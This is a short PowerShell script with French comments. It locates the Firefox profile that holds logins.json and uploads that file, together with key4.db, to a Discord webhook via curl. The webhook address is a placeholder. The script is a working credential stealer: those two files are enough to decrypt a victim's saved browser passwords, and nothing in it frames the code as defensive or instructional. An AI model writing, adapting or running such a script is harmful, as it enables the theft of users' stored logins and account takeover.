# --- CONFIGURATION ---
$hook = "TON_URL_WEBHOOK_DISCORD"

# --- RECHERCHE DYNAMIQUE DU BON PROFIL ---
$ffPath = "$env:APPDATA\Mozilla\Firefox\Profiles"

# On cherche récursivement le fichier logins.json pour trouver le dossier actif
$targetFile = Get-ChildItem -Path $ffPath -Filter "logins.json" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1

if ($targetFile) {
    # On récupère le dossier qui contient ce fichier
    $profileDir = $targetFile.DirectoryName
    
    $lPath = Join-Path $profileDir "logins.json"
    $kPath = Join-Path $profileDir "key4.db"

    # Envoi des fichiers vers Discord
    # On utilise curl pour envoyer les fichiers réels
    if (Test-Path $lPath) { curl.exe -F "file=@$lPath" $hook }
    if (Test-Path $kPath) { curl.exe -F "file=@$kPath" $hook }
}
